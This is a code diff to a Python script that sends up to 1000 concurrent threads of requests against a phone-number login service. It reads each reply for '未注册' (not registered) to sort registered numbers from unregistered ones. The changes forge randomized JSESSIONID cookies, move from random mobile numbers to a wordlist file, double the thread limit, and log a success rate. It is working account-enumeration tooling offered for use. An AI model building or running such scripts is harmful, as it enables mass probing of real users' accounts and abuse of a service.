@@ -81,7 +81,7 @@ class tel:
     #         input_element(tel_input_xpath,'13940273817')# 弄出验证码框
     #         input_element(pwd_input_xpath,'asldlfhawe')
     #         submit_btn.click()
-    JSESSIONID = '7F2A5FB27919F4FA49B71C%s' % generate_random_str(10)
+    JSESSIONID = '7F2A5FB27919F4%s' % generate_random_str(18)
 
     cookie = {'JSESSIONID': JSESSIONID}
 
@@ -159,7 +159,7 @@ class tel:
                     break
                 elif '未注册' in msg:
                     # n += 1
-                    # print_inf('未注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
+                    print_inf('未注册:%s 成功率%.2f%% 已尝试:%s' % (random_tel, (suc / n) * 100, n))
                     break
                 else:
                     print(msg)
@@ -170,8 +170,8 @@ class tel:
 
 if __name__ == '__main__':
 
-    # for it in open('dic/1.dic', 'r').readlines():
-    while True:
+    for it in open('dic/1.dic', 'r').readlines():
+    # while True:
         # it = fixpackage(it)
         # a = tel()
         # try:
@@ -179,10 +179,8 @@ if __name__ == '__main__':
         # except Exception:
         #     pass
         while True:
-            if threads <= 500:
-                threading.Thread(target=tel().doonce, args=('13'+tel().generate_random_str(8),)).start()
-                threading.Thread(target=tel().doonce, args=('18' + tel().generate_random_str(8),)).start()
-                threading.Thread(target=tel().doonce, args=('15' + tel().generate_random_str(8),)).start()
+            if threads <= 1000:
+                threading.Thread(target=tel().doonce, args=(it,)).start()
                 break
             else:
                 pass
